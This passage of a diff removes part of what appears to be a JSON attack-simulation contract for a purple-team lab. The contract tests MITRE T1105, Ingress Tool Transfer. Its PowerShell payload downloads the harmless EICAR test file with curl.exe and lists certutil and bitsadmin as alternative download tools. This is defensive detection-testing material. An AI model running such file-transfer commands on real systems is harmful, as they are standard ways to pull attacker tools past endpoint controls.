-     "command_content": "$dst = Join-Path $env:TEMP 'wetland-lab-eicar.txt'\ncurl.exe -s -o $dst https://secure.eicar.org/eicar.com.txt\nif (Test-Path $dst) {\n  Write-Output \"WETLAND-LAB ingress: downloaded EICAR test file via curl.exe -> $dst (T1105)\"\n} else {\n  Write-Output 'WETLAND-LAB ingress: download blocked by proxy/AV — that is a valid detection'\n}\nWrite-Output 'detect: curl.exe writing a known-bad to disk; proxy/NDR tool transfer; AV on-write'\nWrite-Output 'alt LOLBins to test: certutil -urlcache -f <url> <out> ; bitsadmin /transfer'\n"
-    },
-    "injector_contract_created_at": "2026-10-30T20:02:35.585585Z",
-    "injector_contract_updated_at": "2026-10-30T20:02:35.585588Z",
-    "injector_contract_attack_patterns": [
-     {
-      "attack_pattern_id": "9b8e4bdb-fbbd-5cbd-acf2-e604fedc49e2",
-      "attack_pattern_name": "Ingress Tool Transfer",
-      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
-      "attack_pattern_external_id": "T1105",
-      "attack_pattern_kill_chain_phases": []
-     }
-    ],
-    "injector_contract_domains": [
-     "683fb18c-5200-4aec-b618-6ded488d3cde"
-    ],
-    "injector_contract_vulnerabilities": [],
-    "injector_contract_atomic_testing": true,
-    "injector_contract_import_available": false,
-    "injector_contract_id": "8a25fab1-db21-5677-a064-99639c8d8215",
     "injector_contract_injector_type": "openaev_implant",
     "injector_contract_arch": "ALL_ARCHITECTURES",
     "injector_contract_payload_status": "VERIFIED",
